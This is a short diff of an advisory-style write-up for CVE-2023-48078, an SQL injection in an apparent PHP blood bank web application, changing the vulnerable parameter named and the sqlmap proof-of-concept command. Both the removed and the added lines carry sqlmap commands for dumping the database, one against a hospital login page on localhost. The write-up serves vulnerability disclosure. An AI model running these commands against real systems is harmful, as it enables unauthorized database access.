@@ -16,11 +16,11 @@
 + https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-48078
 + https://nvd.nist.gov/vuln/detail/CVE-2023-48078
 # Description
-+ The lack of proper input validation and sanitization on the 'hemail' and 'hpassword' parameters allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database
++ The lack of proper input validation and sanitization on the 'title' parameters allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database
 
 
 # Proof of Concept (PoC) : 
-+ `sqlmap -u "http://localhost/bloodbank/file/hospitalLogin.php" --method POST --data "hemail=test@test&hpassword=test&hlogin=Login" -p hemail --risk 3 --level 3 --dbms mysql --batch --current-db`
++ `sqlmap -r request.txt --risk 3 --level 3 --dbms mysql --batch --current-db`
 
 ```
 ---
